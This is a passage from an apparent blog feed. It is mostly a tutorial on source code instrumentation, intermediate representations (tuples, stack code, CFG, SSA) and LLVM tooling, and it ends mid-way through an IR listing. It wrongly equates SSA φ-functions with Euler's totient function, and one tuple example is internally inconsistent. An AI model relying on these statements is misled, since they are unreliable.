<p>Thus, the pintool was able to correctly classify the two loops with the correct number of iterations.</p>
<p>All the above API methods have been introduced in order to give the reader an idea of how the Pin engine works and how it&rsquo;s working structure is. Browse the documentation, and you&rsquo;ll most probably find the method that best suits your need. If not, you could definitely come up with a hacky approach using combinations of available methods that</p>
]]></content>
        </item>
        
        <item>
            <title>Source Code Instrumentation and LLVM</title>
            <link>https://hexterisk.github.io/blog/posts/2020/05/26/source-code-instrumentation-and-llvm/</link>
            <pubDate>Tue, 26 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/05/26/source-code-instrumentation-and-llvm/</guid>
            <description>Source Code Instrumentation adds specific code meant for instrumentation/analysis, called Instrumentation Code, to the source files of the program under consideration. The source files are then compiled and executed. Since the instrumentation code is integrated into the binary itself, the output from the execution includes the dump of the instrumentation code which can then be used for further analysis and component testing.
Intermediate Representations Representation of a program in a state that lies between the source code and the compiled binary(specifically, the assembly code).</description>
            <content type="html"><![CDATA[<p><strong>Source Code Instrumentation</strong> adds specific code meant for instrumentation/analysis, called <strong>Instrumentation Code</strong>, to the source files of the program under consideration. The source files are then compiled and executed. Since the instrumentation code is integrated into the binary itself, the output from the execution includes the dump of the instrumentation code which can then be used for further analysis and component testing.</p>
<h1 id="intermediate-representations">Intermediate Representations</h1>
<p>Representation of a program in a state that lies between the source code and the compiled binary(specifically, the assembly code). Compilers have a stage of intermediate code generation, where they natively generate IR of the source code.</p>
<p>IR is then used to emit generic assembly code allowing us to use a single universal assembler that can handle the final translation of assembly to machine code for every language. Otherwise, a full native compiler would be required for different languages and different architecture machines.</p>
<p>Moreover, it allows us to perform machine independent optimizations.</p>
<p>Let&rsquo;s take a source code as an example.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">while</span> (x <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> y) {
    x <span style="color:#f92672">=</span> y <span style="color:#f92672">/</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">&gt;&gt;</span> x;
    <span style="color:#66d9ef">if</span> (y) print x <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>;
}
</code></pre></div><p>It can be expressed in different IR formats.</p>
<h3 id="structural">Structural</h3>
<p>Graphically oriented format which is heavily used in source-to-source translations. A graph is formed showing different stages in different shapes along the flow of execution.</p>
<p><img src="/Source_Code_Instrumentation_and_LLVM/irgraphexample.gif" alt="irgraphexample.gif">
<em>Semantic graph.</em></p>
<h3 id="linear">Linear</h3>
<p>Pseudo-code like format with varying levels of abstraction (such as sub types of Tuples). It&rsquo;s shown using simple and compact data structures and is easier to rearrange.</p>
<h5 id="tuples">Tuples</h5>
<p>Instruction-like entities consisting of an operator and zero to three arguments. Arguments can be literals, subroutine references, variables or temporaries.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// Stored form				   // Rendered form
</span><span style="color:#75715e"></span>(JUMP, L2)                          <span style="color:#66d9ef">goto</span> L2
(LABEL, L1)                    L1:
(SHR, <span style="color:#ae81ff">3</span>, x, t0)                     t0 :<span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">&gt;&gt;</span> x
(DIV, y, t0, t1)                    t1 :<span style="color:#f92672">=</span> y <span style="color:#f92672">/</span> t0
(COPY, t1, x)                       x :<span style="color:#f92672">=</span> t1
(JZ, y, L3)                         <span style="color:#66d9ef">if</span> y <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">goto</span> L3
(SUB, x, <span style="color:#ae81ff">3</span>, t2)                     t2 :<span style="color:#f92672">=</span> x <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>
(PRINT, t2)                         print t2
(LABEL, L3)                    L3:
(LABEL, L2)                    L2:
(MUL, <span style="color:#ae81ff">4</span>, y, t4)                     t4 :<span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> y
(LT, x, t4, t5)                     x :<span style="color:#f92672">=</span> t4 <span style="color:#f92672">&lt;</span> t5
(JNZ, t5, L1)                       <span style="color:#66d9ef">if</span> t5 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">goto</span> L1
</code></pre></div><p>Generally we recognize three levels of tuple sophistication. Let&rsquo;s take another source code as an example.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">double</span> a[<span style="color:#ae81ff">20</span>][<span style="color:#ae81ff">10</span>];
.
.
.
<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; i <span style="color:#f92672">+=</span> di)
    a[i][j<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> j;
</code></pre></div><h6 id="high-level">High-level</h6>
<ul>
<li>Keeps structure of source language program explicit.</li>
<li>Source program can be reconstructed from it.</li>
<li>Operands are semantic objects, including arrays and structs.</li>
<li>No breaking down of array indexing computations.</li>
<li>No thought of registers.</li>
<li>No concern for runtime systems.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">(COPY, <span style="color:#ae81ff">0</span>, i)                        i :<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
(LABEL, L1)                    L1:
(JGE, i, n, L2)                     <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&gt;=</span> n <span style="color:#66d9ef">goto</span> L2
(INDEX, a, i, t0)                   t0 :<span style="color:#f92672">=</span> a[i]
(ADD, j, <span style="color:#ae81ff">2</span>, t1)                     t1 :<span style="color:#f92672">=</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
(INDEX, t0, t1, t2)                 t2 :<span style="color:#f92672">=</span> t0[t1]
(COPY_TO_DEREF, j, t2)              <span style="color:#f92672">*</span>t2 :<span style="color:#f92672">=</span> j
(INCJUMP, i, di, L1)                i <span style="color:#f92672">+=</span> di, <span style="color:#66d9ef">goto</span> L1
(LABEL, L2)                    L2:
</code></pre></div><h6 id="medium-level">Medium-level</h6>
<ul>
<li>Can be source or target oriented.</li>
<li>Language and machine independent.</li>
<li>Break down data structure references to deal only with simple ints and floats.</li>
<li>Great for architecture-independent optimizations.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">(COPY, <span style="color:#ae81ff">0</span>, i)                        i :<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
(LABEL, L1)                    L1:
(JGE, i, n, L2)                     <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&gt;=</span> n <span style="color:#66d9ef">goto</span> L2
(MUL, i, <span style="color:#ae81ff">80</span>, t0)                    t0 :<span style="color:#f92672">=</span> i <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span>
(ADD, a, t0, t1)                    t1 :<span style="color:#f92672">=</span> a <span style="color:#f92672">+</span> t0
(ADD, j, <span style="color:#ae81ff">2</span>, t2)                     t2 :<span style="color:#f92672">=</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
(MUL, t2, <span style="color:#ae81ff">8</span>, t3)                    t3 :<span style="color:#f92672">=</span> t2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
(ADD, t1, t3, t4)                   t4 :<span style="color:#f92672">=</span> t1 <span style="color:#f92672">+</span> t3
(COPY_TO_DEREF, j, t4)              <span style="color:#f92672">*</span>t4 :<span style="color:#f92672">=</span> j
(ADD, i, di, i)                     i :<span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> di
(JUMP, L1)                          <span style="color:#66d9ef">goto</span> L1
(LABEL, L2)                    L2:
</code></pre></div><h6 id="low-level">Low-level</h6>
<ul>
<li>Extremely close to machine architecture.</li>
<li>Architecture dependent.</li>
<li>Deviates from target language only in its inclusion of pseudo-operations and symbolic (virtual) registers.</li>
<li>Intimately concerned with run-time storage management issues like stack frames and parameter passing mechanisms.</li>
<li>For architecture dependent optimizations.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">(LDC, <span style="color:#ae81ff">0</span>, r0)                        r0 :<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
(LOAD, j, r1)                       r1 :<span style="color:#f92672">=</span> j
(LOAD, n, r2)                       r2 :<span style="color:#f92672">=</span> n
(LOAD, di, r3)                      r3 :<span style="color:#f92672">=</span> di
(LOAD, a, r4)                       r4 :<span style="color:#f92672">=</span> a
(LABEL, L1)                    L1:
(JGE, r0, r2, L2)                   <span style="color:#66d9ef">if</span> r0 <span style="color:#f92672">&gt;=</span> r2 <span style="color:#66d9ef">goto</span> L2
(MUL, r0, <span style="color:#ae81ff">80</span>, r5)                   r5 :<span style="color:#f92672">=</span> r0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span>
(ADD, r4, r5, r6)                   r6 :<span style="color:#f92672">=</span> r4 <span style="color:#f92672">+</span> r5
(ADD, r1, <span style="color:#ae81ff">2</span>, r7)                    r7 :<span style="color:#f92672">=</span> r1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
(MUL, r7, <span style="color:#ae81ff">8</span>, r8)                    r8 :<span style="color:#f92672">=</span> r7 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
(ADD, r6, r8, r9)                   r9 :<span style="color:#f92672">=</span> r6 <span style="color:#f92672">+</span> r8
(TOFLOAT, r1, f0)                   f0 :<span style="color:#f92672">=</span> tofloat r1
(STOREIND, f0, r9)                  <span style="color:#f92672">*</span>r9 :<span style="color:#f92672">=</span> f0
(ADD, r0, r3, r0)                   r0 :<span style="color:#f92672">=</span> r0 <span style="color:#f92672">+</span> r3
(JUMP, L1)                          <span style="color:#66d9ef">goto</span> L1
(LABEL, L2)                    L2:
</code></pre></div><h5 id="stack-code">Stack Code</h5>
<p>Originally used for stack-based computers, and therefore use implicit names instead of explicit since explicit names take up space. It&rsquo;s simple to generate and execute.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#66d9ef">goto</span> L2
L1:
    load y
    load_constant <span style="color:#ae81ff">3</span>
    load x
    shr
    div
    store x
    load y
    jump_if_zero L3
    load x
    load_constant <span style="color:#ae81ff">3</span>
    sub
    print
L3:
L2:
    load x
    load_constant <span style="color:#ae81ff">4</span>
    load y
    mul
    less_than
    jump_if_not_zero L1
</code></pre></div><h5 id="three-address-code">Three Address Code</h5>
<p>Has a compact form with proper names, resembling a general format for most machines.</p>
<p>It has statements of the form:</p>
<p><em>x ← y op z</em>,    where <em>op</em> is any operator and <em>(x, y, z)</em> are names.</p>
<p>For example, the expression <em>z ← x - 2 * y</em> will be decomposed into:</p>
<p><em>t ← 2 * y</em></p>
<p><em>z ← x - t</em></p>
<p>and then into assembly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">load r1, y
loadI r2, <span style="color:#ae81ff">2</span>
mult r3, r2, r1
load r4, x
sub r5, r4, r3
</code></pre></div><h3 id="hybrid">Hybrid</h3>
<p>A combination of both, Graphs and Linear code.</p>
<h5 id="control-flow-graph">Control Flow Graph</h5>
<p>A graph whose nodes are basic blocks and whose edges are transitions between blocks.</p>
<p>A <strong>Basic Block</strong> is a:</p>
<ul>
<li>maximal-length sequence of instructions that will execute in its entirety.</li>
<li>maximal-length straight-line code block.</li>
<li>maximal-length code block with only one entry and one exit.</li>
</ul>
<p>For example, the line code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">     <span style="color:#66d9ef">goto</span> L2
L1:
     t0 :<span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">&gt;&gt;</span> x
     t1 :<span style="color:#f92672">=</span> y <span style="color:#f92672">/</span> t0
     x :<span style="color:#f92672">=</span> t1
     <span style="color:#66d9ef">if</span> y <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">goto</span> L3
     t2 :<span style="color:#f92672">=</span> x <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>
     print t2
L3:
L2:
     t4 :<span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> y
     x :<span style="color:#f92672">=</span> t4 <span style="color:#f92672">&lt;</span> t5
     <span style="color:#66d9ef">if</span> t5 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">goto</span> L1
</code></pre></div><p>can be represented as a CFG as:</p>
<p><img src="/Source_Code_Instrumentation_and_LLVM/controlgraphexample.gif" alt="controlgraphexample.gif">
<em>Control flow graph.</em></p>
<h3 id="static-single-assignment">Static Single Assignment</h3>
<p>The idea with SSA is to define each name only once in a program. This is achieved by using φ-functions, or Euler&rsquo;s totient functions. These functions count positive integers upto a given integer <em>n</em>, that are relatively prime to <em>n</em>.</p>
<p>It can generally be found in Fortran or C compilers.</p>
<p>So, a pseudo-code of the form:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">x <span style="color:#960050;background-color:#1e0010">←</span> ...
y <span style="color:#960050;background-color:#1e0010">←</span> ...
<span style="color:#66d9ef">while</span> (x <span style="color:#f92672">&lt;</span> k)
    x <span style="color:#960050;background-color:#1e0010">←</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
    y <span style="color:#960050;background-color:#1e0010">←</span> y <span style="color:#f92672">+</span> x
</code></pre></div><p>can be represented in SSA as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    x0 <span style="color:#960050;background-color:#1e0010">←</span> ...
    y0 <span style="color:#960050;background-color:#1e0010">←</span> ...
    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">&gt;</span> k) <span style="color:#66d9ef">goto</span> next
loop:    x1 <span style="color:#960050;background-color:#1e0010">←</span> <span style="color:#960050;background-color:#1e0010">φ</span>(x0,x2)
         y1 <span style="color:#960050;background-color:#1e0010">←</span> <span style="color:#960050;background-color:#1e0010">φ</span>(y0,y2)
         x2 <span style="color:#960050;background-color:#1e0010">←</span> x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
         y2 <span style="color:#960050;background-color:#1e0010">←</span> y1 <span style="color:#f92672">+</span> x2
         <span style="color:#66d9ef">if</span> (x2 <span style="color:#f92672">&lt;</span> k) <span style="color:#66d9ef">goto</span> loop
next: ... 
    
    <span style="color:#75715e">// φ-function will determine which out of the parameters given to us were actually used to get there. So the first time the loop is ran, x1 will have the value of x0 while all the subsequent times, x1 will have the value of x2. Similar for y1.
</span></code></pre></div><p>The primary benefit of this form is it&rsquo;s ability to simultaneously simplify and improve results of various compiler optimizations just by simplifying properties of the variables.</p>
<h1 id="llvm">LLVM</h1>
<p><strong>L</strong>ow <strong>L</strong>evel <strong>V</strong>irtual <strong>M</strong>achine is an IR. The main idea behind it was to get an interface to the compilation process so that optimizations to the binary could be applied then itself, rather than using JIT compilers to provide runtime optimizations. This was because these compilations by virtual machines(such as JVM) were online which meant that these optimizations had to be performed every time a certain piece of code ran. Thus, the heavy lifting task of optimization was moved from runtime to compile time.</p>
<p>Use the following script to setup LLVM.</p>
<p>Make sure you have the <strong>clang</strong> compiler installed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/llvm/llvm-project.git
cd llvm-project
mkdir build
cd build
cmake -G <span style="color:#e6db74">&#34;Unix Makefiles&#34;</span> -DLLVM_TARGETS_TO_BUILD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X86&#34;</span> -DLLVM_TARGET_ARCH<span style="color:#f92672">=</span>X86 -DCMAKE_BUILD_TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Release&#34;</span> -DLLVM_BUILD_EXAMPLES<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -DCLANG_BUILD_EXAMPLES<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ../llvm/
cmake --build .
</code></pre></div><p>The LLVM IR can be displayed in two formats. Let the source code be in a file named <em>SOURCEFILE.cpp</em>.</p>
<ol>
<li>Assembly Format
<ul>
<li>Use the tool <strong>clang</strong> to produce llvm IR.
<ul>
<li>Run <code>clang++ -S -emit-llvm SOURCEFILE.cpp</code> to produce the IR by the name <code>SOURCEFILE.ll</code>.</li>
</ul>
</li>
<li>The <em>.ll</em> file is the LLVM IR in assembly format. It can be directly executed using a tool called <strong>llvm-lli</strong>. It&rsquo;s a JIT execution engine. Run <code>lli SOURCEFILE.ll</code> to execute it.</li>
</ul>
</li>
<li>Bit-code Format
<ul>
<li>Use the tool <strong>llvm-as</strong> to produce bit-code format of the IR.
<ul>
<li>Run <code>llvm-as SOURCEFILE.ll</code> to produce the bit-code file by the name <code>SOURCEFILE.bc</code>.</li>
</ul>
</li>
<li>This assembly format of the IR can be converted into <strong>bit-code</strong>, a <em>.bc</em> file which is the binary format of the IR using a tool called <strong>llvm-as</strong>. Run <code>lli SOURCEFILE.bc</code> to execute it.</li>
<li>Use the tool <strong>llvm-dis</strong> to convert bit-code format to assembly format for a given IR.
<ul>
<li>Run <code>llvm-dis SOURCEFILE.bc</code> to produce the assembly format of IR from the bit-code file <code>SOURCEFILE.bc</code>.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>The tool <strong>llc</strong>, a static compiler, can then be used to convert the IR, assembly as well as bit-code format, into assembly code. Run <code>llc SOURCEFILE.ll</code> or <code>llc SOURCEFILE.bc</code> to compile the format you have into assembly code.</p>
<p>The tool <strong>opt</strong>, can be used to analyze and optimize the source code. It makes several passes over the code at various levels of granularity looking for opportunities to optimize it.</p>
<ul>
<li>Module Pass
<ul>
<li>Single source files presented as modules.</li>
</ul>
</li>
<li>Call Graph Pass
<ul>
<li>Traverses the program bottom-up.</li>
</ul>
</li>
<li>Function Pass
<ul>
<li>Runs over individual functions.</li>
</ul>
</li>
<li>Basic Block Pass
<ul>
<li>Runs over a basic block at a time inside the functions/routines.</li>
</ul>
</li>
<li>Immutable Pass
<ul>
<li>Simply provides information about the current configuration of the compiler. Not a regular type of pass.</li>
</ul>
</li>
<li>Region Pass
<ul>
<li>Executes on each single-entry-single-exit code space.</li>
</ul>
</li>
<li>Machine Function Pass
<ul>
<li>Executes on the machine-dependent representation of each LLVM function.</li>
</ul>
</li>
<li>Loop Pass
<ul>
<li>Focuses on one loop at a time, independent of all the other loops.</li>
</ul>
</li>
</ul>
<p>The passes can achieve either of the two goals.</p>
<ol>
<li>Analysis Pass
<ul>
<li>Computes information that can be used by other passes.</li>
</ul>
</li>
<li>Transform Pass
<ul>
<li>Mutates the program based on the information it has.</li>
</ul>
</li>
</ol>
<p>Let&rsquo;s take a sample code to observe the difference between <strong>pass by value</strong> and <strong>pass by pointers</strong> at the IR level.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// hello.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b) {
    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">addptr</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> a, <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> b) {
    <span style="color:#66d9ef">return</span> (<span style="color:#f92672">*</span>a)<span style="color:#f92672">+</span>(<span style="color:#f92672">*</span>b);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
    <span style="color:#66d9ef">int</span> a <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
    printf(<span style="color:#e6db74">&#34;Hello world!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    printf(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, add(a, b));
    printf(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, addptr(<span style="color:#f92672">&amp;</span>a, <span style="color:#f92672">&amp;</span>b));
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>We get the IR to be</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">; ModuleID <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>hello.cpp<span style="color:#960050;background-color:#1e0010">&#39;</span>
source_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hello.cpp&#34;</span>
target datalayout <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&#34;</span>
target triple <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;x86_64-pc-linux-gnu&#34;</span>

<span style="color:#960050;background-color:#1e0010">@</span>.str <span style="color:#f92672">=</span> private unnamed_addr constant [<span style="color:#ae81ff">14</span> x i8] c<span style="color:#e6db74">&#34;Hello world!</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">A</span><span style="color:#ae81ff">\00</span><span style="color:#e6db74">&#34;</span>, align <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">@</span>.str<span style="color:#ae81ff">.1</span> <span style="color:#f92672">=</span> private unnamed_addr constant [<span style="color:#ae81ff">4</span> x i8] c<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">A</span><span style="color:#ae81ff">\00</span><span style="color:#e6db74">&#34;</span>, align <span style="color:#ae81ff">1</span>

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 <span style="color:#960050;background-color:#1e0010">@</span>_Z3addii(i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>, i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">1</span>) <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span> {
  <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> alloca i32, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">=</span> alloca i32, align <span style="color:#ae81ff">4</span>
  store i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>, align <span style="color:#ae81ff">4</span>
  store i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">1</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=</span> load i32, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">=</span> load i32, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">=</span> add nsw i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>, <span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>
  ret i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 <span style="color:#960050;background-color:#1e0010">@</span>_Z6addptrPiS_(i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">1</span>) <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span> {
  <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> alloca i32<span style="color:#f92672">*</span>, align <span style="color:#ae81ff">8</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">=</span> alloca i32<span style="color:#f92672">*</span>, align <span style="color:#ae81ff">8</span>
  store i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>, i32<span style="color:#f92672">**</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>, align <span style="color:#ae81ff">8</span>
  store i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">1</span>, i32<span style="color:#f92672">**</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span>, align <span style="color:#ae81ff">8</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=</span> load i32<span style="color:#f92672">*</span>, i32<span style="color:#f92672">**</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>, align <span style="color:#ae81ff">8</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">=</span> load i32, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">=</span> load i32<span style="color:#f92672">*</span>, i32<span style="color:#f92672">**</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span>, align <span style="color:#ae81ff">8</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">=</span> load i32, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">=</span> add nsw i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>, <span style="color:#f92672">%</span><span style="color:#ae81ff">8</span>
  ret i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">9</span>
}

; Function Attrs: noinline norecurse optnone sspstrong uwtable
define dso_local i32 <span style="color:#960050;background-color:#1e0010">@</span>main() <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span> {
  <span style="color:#f92672">%</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> alloca i32, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> alloca i32, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> alloca i32, align <span style="color:#ae81ff">4</span>
  store i32 <span style="color:#ae81ff">0</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">1</span>, align <span style="color:#ae81ff">4</span>
  store i32 <span style="color:#ae81ff">1</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>, align <span style="color:#ae81ff">4</span>
  store i32 <span style="color:#ae81ff">2</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">=</span> call i32 (i8<span style="color:#f92672">*</span>, ...) <span style="color:#960050;background-color:#1e0010">@</span>printf(i8<span style="color:#f92672">*</span> getelementptr inbounds ([<span style="color:#ae81ff">14</span> x i8], [<span style="color:#ae81ff">14</span> x i8]<span style="color:#f92672">*</span> <span style="color:#960050;background-color:#1e0010">@</span>.str, i64 <span style="color:#ae81ff">0</span>, i64 <span style="color:#ae81ff">0</span>))
  <span style="color:#f92672">%</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=</span> load i32, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>, align <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">%</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">=</span> load i32, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>, align <span style="color:#ae81ff">4</span>
